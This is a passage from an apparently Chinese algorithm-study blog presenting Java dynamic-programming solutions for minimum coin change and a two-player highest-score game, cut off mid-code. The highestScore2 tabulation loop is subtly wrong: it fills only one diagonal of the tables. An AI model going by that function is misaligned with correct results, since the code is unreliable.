punctuation">(</span>result<span class="token punctuation">,</span> p<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">CoinsMin</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> aim<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> aim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> aim<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-记忆化搜索-1"><a href="#2-0-记忆化搜索-1" class="headerlink" title="2.0 记忆化搜索"></a>2.0 记忆化搜索</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>index <span class="token operator">==</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> rest <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 要返回的结果，先初始化为-1</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">*</span>arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span>rest<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 当前用了k*arr[index]这些钱，那就还需要找rest-k*arr[index]</span>        <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token function">process2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> rest <span class="token operator">-</span> k<span class="token operator">*</span>arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> p <span class="token operator">+</span> k <span class="token operator">:</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">CoinsMin2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> aim<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> aim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>aim<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> aim<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-严格表结构-1"><a href="#3-0-严格表结构-1" class="headerlink" title="3.0 严格表结构"></a>3.0 严格表结构</h4><h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>每个数由下一行的减去k个该index位置的面值的结果决定，取当前k+下一行的每个决定值的最小值</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f15.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">CoinsMin4</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> aim<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> aim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">N</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">N</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> rest <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> rest <span class="token operator">&lt;=</span> aim<span class="token punctuation">;</span> rest<span class="token operator">++</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token class-name">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>index<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>index<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> rest <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>rest<span class="token operator">&lt;</span>aim<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">*</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> rest<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> p <span class="token operator">=</span> dp<span class="token punctuation">[</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest <span class="token operator">-</span> k <span class="token operator">*</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> p <span class="token operator">+</span> k <span class="token operator">:</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">,</span> p <span class="token operator">+</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h5><p>然而我们其实不需要遍历k，因为我们可以看出想得到某个数据，该数是由a, b, c, d, … 决定出来的，而rest-arr[i]是由b, c, d, … 决定出来的，所以我们就可以通过a和rest-arr[i]直接决定该数，从而少了一层循环</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f12.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">CoinsMin3</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> aim<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> aim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">N</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">N</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 设置最后一行的值，除了dp[N][0]为0之外，其他都是-1</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> rest <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> rest <span class="token operator">&lt;=</span> aim<span class="token punctuation">;</span> rest<span class="token operator">++</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token class-name">N</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>  <span class="token comment">// 从下往上计算每一行</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> rest <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> rest <span class="token operator">&lt;=</span> aim<span class="token punctuation">;</span> rest<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 每一行都从左往右</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 初始时先设置dp[i][rest]的值无效</span>            <span class="token comment">// 下面的值如果有效就先设置成下面的值</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">// 左边的位置不越界并且有效</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>rest <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 如果之前下面的值无效</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment">// 说明下面和左边的值都有效，取最小值</span>                <span class="token keyword">else</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-题目三"><a href="#0x03-题目三" class="headerlink" title="0x03 题目三"></a>0x03 题目三</h3><p>左神算法0x03中暴力递归下的分数最高问题</p><h4 id="1-0-暴力递归-2"><a href="#1-0-暴力递归-2" class="headerlink" title="1.0 暴力递归"></a>1.0 暴力递归</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">highestScore</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-严格表结构-2"><a href="#3-0-严格表结构-2" class="headerlink" title="3.0 严格表结构"></a>3.0 严格表结构</h4><blockquote><p>1）确定可变参数</p><p>2个可变参数，l和r</p><p>2）确定最终目标</p><p>f一张表，s一张表，都是求(0,3)位置的值，可以看到l一定不会大于r，所以表的左下部分废弃</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f13.png"></p><p>3）base case</p><p>f的base case <code>l == r</code> -&gt; <code>arr[l]</code></p><p>s的base case <code>l == r</code> -&gt; <code>0</code></p><p>4）搞清表中各个数的依赖关系</p><p>f和s互相依赖，比如求f(0,3)则需要s(0,3-1)和s(0+1,3)，函数s同理</p><p>5）确定依次计算的顺序</p><p>所以从对角线往右上角求即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">highestScore2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">N</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> row <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>col<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>row<span class="token operator">&lt;</span><span class="token class-name">N</span> <span class="token operator">&amp;&amp;</span> col <span class="token operator">&lt;</span> <span class="token class-name">N</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            f<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>row<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            s<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            col<span class="token operator">++</span><span class="token punctuation">;</span>            row<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        col<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token 